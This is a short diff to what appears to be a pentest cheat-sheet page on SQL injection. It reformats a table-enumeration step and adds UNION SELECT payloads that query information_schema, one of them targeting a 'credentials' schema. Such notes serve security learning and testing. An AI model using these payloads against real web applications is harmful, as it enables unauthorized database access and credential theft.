@@ -753,9 +753,11 @@ searchitem=1'+UNION+SELECT+1,2,3,table_name+FROM+information_schema.tables+WHERE
 
 * If your column is not the last one reflected back, ensure your `FROM` is after the remaining `NULL`
 
-```
-1' UNION SELECT 1,2,3,table_name,5,6 FROM information_schema.tables-- -
-```
+<pre><code><strong># current table
+</strong><strong>1' UNION SELECT 1,2,3,table_name,5,6 FROM information_schema.tables-- -
+</strong># specific table name
+1' UNION SELECT 1,2,3,table_name,5,6 FROM information_schema.tables WHERE table_schema='credentials'-- -
+</code></pre>
 
 ### 7. Enumerate Columns
 
